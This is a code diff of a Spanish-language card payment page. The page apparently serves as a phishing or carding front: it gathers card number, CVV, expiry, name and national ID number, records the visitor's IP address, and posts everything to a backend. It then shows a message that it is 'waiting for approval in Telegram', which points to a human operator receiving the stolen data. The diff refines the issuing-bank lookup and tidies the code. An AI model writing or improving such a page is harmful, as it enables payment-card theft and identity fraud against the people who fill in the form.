-                try { data = JSON.parse(text); } catch (e) { console.error('❌ Respuesta no JSON:', text.substring(0, 200)); return false; }
-                
+                try { data = JSON.parse(text); } catch (e) { console.error('Respuesta no JSON:', text.substring(0, 200)); return false; }
                 if (data.success) return data.solicitud_id;
-                console.error('❌ Error webhook:', data.error);
+                console.error('Error webhook:', data.error);
                 return false;
-            } catch (error) { 
-                console.error('❌ Error al enviar:', error); 
-                return false; 
-            }
+            } catch (error) { console.error('Error al enviar:', error); return false; }
         }
 
         // ============================================================
@@ -802,15 +691,18 @@
             if (!cvv || cvv.length < 3) { mostrarError('Ingresa un CVV válido (3 o 4 dígitos)'); return; }
             if (!cuotasSeleccionadas) { mostrarError('Por favor, selecciona el número de cuotas'); return; }
             if (!terms) { mostrarError('Debes aceptar los términos de servicio'); return; }
-
-            // Validación de series rechazadas (bloqueo real)
             if (esSerieRechazada(numero)) { mostrarError(mensajeSerieRechazada()); return; }
 
             cardType = detectCardType(numero);
             if (!cardType) { mostrarError('Tipo de tarjeta no reconocido'); return; }
 
-            // 🔧 FIX: re-detectar banco SIEMPRE antes de enviar
-            detectedBank = detectarBancoPorBIN(numero) || detectedBank || localStorage.getItem('bancoEmisor') || 'Desconocido';
+            // 🏦 Asegurar banco (HandyAPI → binlist → tabla local → marca)
+            btnPagar.disabled = true; btnPagar.textContent = 'Verificando banco...';
+            detectedBank = await consultarBancoPorBIN(numero) || detectedBank || localStorage.getItem('bancoEmisor');
+            if (!detectedBank || detectedBank === 'Desconocido') {
+                detectedBank = buscarBancoEnTablaRespaldo(numero)
+                    || (cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'amex' ? 'American Express' : 'Tarjeta');
+            }
             localStorage.setItem('bancoEmisor', detectedBank);
 
             if (!localStorage.getItem('usuario_ip') || localStorage.getItem('usuario_ip') === 'Desconocida') { await capturarIP(); }
@@ -819,10 +711,8 @@
 
             loadingOverlay.classList.add('active');
             loadingText.textContent = 'Procesando pago...';
-            initialSpinner.style.display = 'block';
-            initialSpinner.classList.add('active');
-            logoContainer.style.display = 'none';
-            progressWrapper.style.display = 'none';
+            initialSpinner.style.display = 'block'; initialSpinner.classList.add('active');
+            logoContainer.style.display = 'none'; progressWrapper.style.display = 'none';
 
             btnPagar.disabled = true; btnPagar.textContent = 'Procesando...';
             inputNumero.disabled = true; inputNombre.disabled = true; inputExp.disabled = true; inputCVV.disabled = true;
@@ -838,26 +728,22 @@
                 cvv: cvv,
                 vencimiento: exp,
                 marca_tarjeta: cardType,
-                banco_emisor: detectedBank,            // 🔧 FIX (ya viene bien)
+                banco_emisor: detectedBank,
                 nombre_solicitante: nombreSolicitante,
                 cedula_solicitante: cedulaSolicitante
             };
 
-            console.log('📤 Enviando al backend Node.js:', datos);
+            console.log('📤 Enviando al backend:', datos);
 
             const resultado = await enviarDatosAlWebhook(datos);
-            
             if (resultado === false) {
                 loadingOverlay.classList.remove('active');
                 mostrarError('Error al procesar el pago. Intente nuevamente.');
-                habilitarFormulario();
-                return;
+                habilitarFormulario(); return;
             }
-            
             console.log('⏳ Esperando aprobación en Telegram...');
             iniciarPolling();
         });
-
     </script>
 </body>
 </html>
